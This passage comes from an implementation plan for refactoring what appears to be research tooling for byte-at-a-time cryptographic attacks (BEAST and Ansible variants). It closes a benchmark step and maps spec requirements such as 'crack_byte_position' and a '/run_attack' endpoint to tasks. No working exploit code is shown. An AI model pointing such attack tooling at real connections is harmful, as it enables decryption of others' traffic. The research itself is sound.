cat /tmp/bench_allopts.csv
```

Expected: header + 2 rows with numeric `per_attack_min/max/avg/total` and `per_position_count/min/max/avg` filled in.

- [ ] **Step 3: Commit nothing (smoke-only); record the results if useful**

Optional: save the four CSVs into a `benchmark/` directory in the repo for reference. If the user requests that, land it as a separate commit; otherwise, do not commit benchmark output.

---

## Spec coverage check

| Spec requirement | Implemented in |
|---|---|
| Terminology rename (noise → alignment data) | Tasks 2, 3, 5, 6, 10, 13 |
| `attacker/attack/` package layout | Task 1 |
| `AttackConfig` dataclass with overlay | Task 3 |
| `AlignmentMode` enum | Task 3 |
| Adapter protocol | Task 4 |
| Engine `run_attack` + `crack_byte_position` | Task 5 |
| `_pick_alignment_with_largest_gap` | Task 5 |
| `_select_initial_alignment` | Task 5 |
| Five independent optimization toggles | Task 5 (engine branches per flag) |
| Outlier-retry baked in, threshold tunable | Task 5 |
| DirectAdapter + default_config | Task 6 |
| BeastAdapter + default_config | Task 10 |
| AnsibleAdapter + default_config | Task 13 |
| BrowserBridge relocation | Task 16 |
| Single `/run_attack` endpoint with variant dispatch | Tasks 7, 16 |
| Scenario-override semantics on server side | Task 7 (overlay in handler) |
| `verify_direct.py` rename + rewire | Task 8 |
| `verify_beast.py` rewire | Task 11 |
| `verify_ansible.py` rewire | Task 14 |
| Delete old attack modules + test scripts | Task 16 |
| Scenario presets + `--scenario` / `--fixed-nl` / `--config` | Task 17 |
| Per-attack + per-position aggregation, CSV summary | Task 17 |
| Correctness gates (three verify scripts) | Tasks 9, 12, 15, 16 step 6 |
| Two Tries extension point reserved | Engine structure (Task 5) isolates round-body for future `oracle_mode` |
